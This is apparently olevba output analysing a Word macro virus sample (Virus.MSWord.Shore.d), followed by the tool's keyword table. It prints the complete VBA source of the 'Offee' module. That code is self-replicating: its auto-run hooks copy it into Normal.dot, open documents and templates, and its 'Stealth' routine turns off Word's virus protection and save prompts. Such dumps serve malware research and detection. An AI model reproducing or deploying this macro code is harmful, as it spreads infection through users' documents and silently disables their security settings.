olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shore.d-6d58cc182170ccdf7388025da97d2a42033bbb3c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shore.d-6d58cc182170ccdf7388025da97d2a42033bbb3c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Offee.bas 
in file: Virus.MSWord.Shore.d-6d58cc182170ccdf7388025da97d2a42033bbb3c - OLE stream: 'Macros/VBA/Offee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'Thanks to cyberHack, Astia, Marker, BPPHCK, etc.
'I love ITS
'
'Public declaration
'
'
Public Const SeriesNumber = 2017
Public Const ModuleName = "Offee", mw = "Microsoft Word", _
        OFC = "Offshore Engineering", _
        Peace = "Peace at the sea...", _
        SerNum$ = "Series Number", _
        pass = "Password ", _
        badboy = "Want to be a bad boy....", _
        scrollCap = "Normal." & ModuleName & ".scrollCaption", _
        scrollCap2 = "Normal." & ModuleName & ".scrollCaption2", _
        ScrollingProc = "Normal." & ModuleName & ".Scrolling", _
        ScrollStringProc = "Normal." & ModuleName & ".ScrollString", _
        AnimationProc = "Normal." & ModuleName & ".Animation"

Public Const msg = "Unable to get the access. Request aborted...", _
        aaa = "§·_n²__", bbb = "wenni", ccc = "cool", _
        abadacc = "Bad access...", _
        code = "backbone130274", ddd = "junkies9908", eee = "Timor9909"

Public anIter As Integer
Public AppCaption As String, AppCaptionPos As Integer, _
        WinCaption As String, WinCaptionPos As Integer, _
        Seq As Integer, Iteration As Integer

Public anCap As String, anPos As Integer, anSeq As Integer, _
        ToolsOptionsDlg As Dialog, _
        OrganizerDlg As Dialog, _
        ToolsTemplatesDlg As Dialog, _
        ToolsMacrosDlg As Dialog, _
        FormatStyleDlg As Dialog, _
        MasterOffee As String

'procedures in Offee2000 module
'
Sub ClearAddDocProp()
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    
    NormalTemplate.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False
End Sub


Function getDocPropExist(theObject As Object) As Boolean
Dim adp As DocumentProperty
    getDocPropExist = False
    For Each adp In theObject.CustomDocumentProperties
    With adp
        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
            .Value = SeriesNumber Then
            getDocPropExist = True
            Exit Function
        End If
    End With
    Next adp
End Function

Function getModuleExist(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    getModuleExist = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = ModuleName Then
            getModuleExist = True
            Exit Function
        End If
    Next anObject
End Function
    
Function getInfected(theObject As Object) As Boolean
    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
End Function

Sub clearMacros(theObject As Object)
Dim aDocProp As DocumentProperty
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
        Else
            On Error Resume Next
            With anObject.CodeModule
                .DeleteLines 1, .CountOfLines
            End With
        End If
    Next anObject
    
    For Each aDocProp In theObject.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
End Sub

Sub copyMacros(theSource As Object, theDestination As Object)
Dim aDocProp As DocumentProperty
    If Not getDocPropExist(theDestination) Then _
        theDestination.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False

    On Error Resume Next
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=ModuleName, _
            Object:=wdOrganizerObjectProjectItems
End Sub

Sub Infecting(theSource As Object, theDestination As Object)
    On Error Resume Next
    If Not getInfected(theSource) Then Exit Sub
    If Not getInfected(theDestination) Then
        Application.OrganizerRename _
            Source:=theDestination.FullName, _
            Name:=ModuleName, newname:="xxxx", _
            Object:=wdOrganizerObjectProjectItems
        clearMacros theDestination
        copyMacros theSource, theDestination
        theDestination.Save True
    End If
End Sub

Sub Copy2Normal()
Dim ATemp As Template, AI As AddIn, ADoc As Document
    Stealth
    On Error Resume Next
    If getInfected(ActiveDocument) Then GoTo Jump2
    
    If Documents.Count > 0 Then
        For Each ADoc In Documents
            If getInfected(ADoc) Then
                Infecting ADoc, ActiveDocument
                GoTo Jump2
            End If
        Next ADoc
    End If
    
    If Templates.Count > 0 Then
        For Each ATemp In Templates
            If getInfected(ATemp) Then
                Infecting ATemp, ActiveDocument
                GoTo Jump2
            End If
        Next ATemp
    End If

Jump2:
    If Documents.Count > 0 Then
        Infecting ActiveDocument, NormalTemplate
        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
            Infecting ActiveDocument, ActiveDocument.AttachedTemplate
        If Templates.Count > 0 Then
            For Each ATemp In Templates
                Infecting ActiveDocument, ATemp
            Next ATemp
        End If
    End If

    With NormalTemplate.VBProject.VBComponents(1).CodeModule
        .DeleteLines 1, .CountOfLines
    End With

    NormalTemplate.Save
    CreateMasterOffee
End Sub

Sub Copy2Document()
Dim ADoc As Document, ATemp As Template
    Stealth
    On Error Resume Next
    If Not getInfected(NormalTemplate) Then
        If getInfected(ActiveDocument) Then
            Copy2Normal
        Else
            For Each ADoc In Documents
                If getInfected(ADoc) Then
                    Infecting ADoc, NormalTemplate
                    GoTo Jump1
                End If
            Next ADoc
            
            For Each ATemp In Templates
                If getInfected(ATemp) Then
                    Infecting ATemp, NormalTemplate
                    GoTo Jump1
                End If
            Next ATemp
        End If
    End If

    If Not getInfected(NormalTemplate) Then
        Application.StatusBar = ModuleName & " has lost forever...."
        Exit Sub
    End If

Jump1:
    For Each ADoc In Documents
        Infecting NormalTemplate, ADoc
        On Error Resume Next
        WordBasic.viewpage

        If ADoc.AttachedTemplate <> NormalTemplate Then
            Infecting NormalTemplate, ADoc.AttachedTemplate
            ADoc.AttachedTemplate = NormalTemplate
        End If
    Next ADoc
End Sub


Sub CreateMasterOffee()
Dim ADoc As Document, AI As AddIn, GoOn As Boolean, Win As Window
    
    On Error Resume Next
    For Each AI In AddIns
        off$ = Left$(AI.Name, Len(ModuleName))
        If off$ = ModuleName Then AI.Delete
    Next AI
    
    If getInfected(NormalTemplate) Then
        MasterOffee = Options.DefaultFilePath(wdPicturesPath) & "\" & ModuleName & Str(SeriesNumber) & ".dot"
        Set ADoc = NormalTemplate.OpenAsDocument
        With ADoc
            .SaveAs fileName:=MasterOffee, FileFormat:=wdFormatTemplate, _
                AddToRecentFiles:=False
            .Close saveChanges:=wdDoNotSaveChanges
        End With
    
        AddIns.Add fileName:=MasterOffee, install:=True
    End If
End Sub


'infection procedures
Sub AutoOpen()
    AnimateCaption
    Stealth
    WordBasic.disableautomacros True
    
    On Error Resume Next
    Copy2Normal
    Copy2Document
    NormalTemplate.Save
End Sub

Sub FileOpen()
    AnimateCaption
    Stealth
    WordBasic.disableautomacros True
    
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        Copy2Document
        Copy2Normal
        On Error Resume Next
        ActiveDocument.Save
    End If
    WordBasic.disableautomacros False
End Sub

Sub AutoClose()
    AnimateCaption
    Stealth
    
    On Error Resume Next
    Copy2Document
    If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
'    ActiveDocument.Saved = True
    ModifyAttr ActiveDocument.FullName
End Sub

Sub FileClose()
Dim afn As String
    WordBasic.disableautomacros True
    
    On Error Resume Next
    AutoClose
    afn = ActiveDocument.FullName
    ActiveDocument.Close
    ModifyAttr afn
    WordBasic.disableautomacros False
End Sub




Sub InitDialog()
    AnimateCaption
    Stealth
    Application.DisplayAlerts = wdAlertsNone
    On Error Resume Next
    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
End Sub
    
    
Sub AutoExec()
Dim Combar As CommandBar
    WordBasic.disableautomacros True
    InitDialog
    
    Copy2Normal
    Copy2Document
    ModifyAttr NormalTemplate.FullName
    ClearAddDocProp
    For Each Combar In Application.CommandBars
        On Error Resume Next
        Combar.reset
    Next Combar
End Sub

Sub AutoExit()
    AutoOpen
    ModifyAttr NormalTemplate.FullName
End Sub

Sub AutoNew()
    AutoExit
End Sub

Sub fileNewDefault()
    AnimateCaption
    Stealth
    WordBasic.fileNewDefault
    AutoExit
End Sub

Sub FileNew()
    AnimateCaption
    If Dialogs(wdDialogFileNew).Show <> 0 Then AutoExit
End Sub

Sub Stealth()
    On Error Resume Next
    With Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
    
    With NormalTemplate
        If .Saved = False Then .Save
    End With
End Sub

Sub NoStealth()
    With Options
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .VirusProtection = True
    End With
    
    On Error Resume Next
    With NormalTemplate
        If .Saved = False Then .Save
    End With
End Sub

Sub ToolsOptions()
    InitDialog
    NoStealth
    
    On Error Resume Next
    WordBasic.ToolsOptions
    Stealth
End Sub


Sub NoAccess()
    a = MsgBox(msg, vbExclamation, abadacc)
    Stealth
    AnimateCaption
End Sub

Function PassDialog() As Boolean
Dim Cruel As String, Passi As String
    PassDialog = False
    Cruel = ccc + Mid(code, 9, 2)
    Passi = pass & "(" & ModuleName & Str(SeriesNumber) & ")  : "
    If LCase(InputBox(Passi, badboy)) = Cruel Then
        PassDialog = True
    Else
        NoAccess
    End If
End Function


Sub ToolsMacro()
    InitDialog
    ToolsMacrosDlg.Display
End Sub


Sub FileTemplates()
    InitDialog
    ToolsTemplatesDlg.Display
End Sub

Sub ViewVbCode()
    AnimateCaption
    Stealth
    Application.ShowVisualBasicEditor = PassDialog
End Sub

Sub viewcode()
    ViewVbCode
End Sub

Sub Organizer()
    InitDialog
    OrganizerDlg.Display
End Sub

Sub FormatStyle()
    InitDialog
    With FormatStyleDlg
        .Display
        .Execute
    End With
End Sub


Sub ModifyAttr(fileName As String)
    On Error Resume Next
    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
End Sub


Sub AnimateCaption()
    On Error Resume Next
    If Documents.Count > 0 Then WordBasic.viewpage
    
    Seq = 0
    Iteration = 0
    Application.OnTime Now + TimeSerial(0, 0, 3), ScrollStringProc
End Sub

Sub ScrollString()
    Select Case Seq
        Case 0
            AppCaption = OFC
            WinCaption = Peace
            Seq = 1
        Case Else
            AppCaption = mw
            RestoreWindowCaption
            If Documents.Count > 0 Then
                WinCaption = ActiveDocument.FullName
            Else
                WinCaption = " "
            End If
            Seq = 0
    End Select
    
    On Error Resume Next
    AppCaptionPos = 0
    WinCaptionPos = 0
    Iteration = Iteration + 1
    
    Application.OnTime Now + TimeSerial(0, 0, 3), ScrollingProc
End Sub

Sub Scrolling()
    Application.Caption = Right$(AppCaption, AppCaptionPos)
    AppCaptionPos = AppCaptionPos + 1
    
    If Documents.Count > 0 Then _
        ActiveWindow.Caption = Right$(WinCaption, WinCaptionPos)
    WinCaptionPos = WinCaptionPos + 1
    
    If WinCaptionPos > Len(WinCaption) And Len(AppCaption) < AppCaptionPos Then
        If Seq = 1 Then
            Application.OnTime Now + TimeSerial(0, 0, 3), ScrollStringProc
        ElseIf Seq = 0 Then
            If Iteration < 5 Then
                Copy2Document
'                Copy2Normal
                Application.OnTime Now + TimeSerial(0, 0, 10), ScrollStringProc
            Else
'                Copy2Normal
                Exit Sub
            End If
        End If
    Else
        Application.OnTime Now + TimeSerial(0, 0, 0.5), ScrollingProc
    End If
End Sub

Sub RestoreWindowCaption()
Dim Win As Window
    On Error Resume Next
    For Each Win In Windows
        Win.Caption = Win.Document.FullName
    Next Win
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

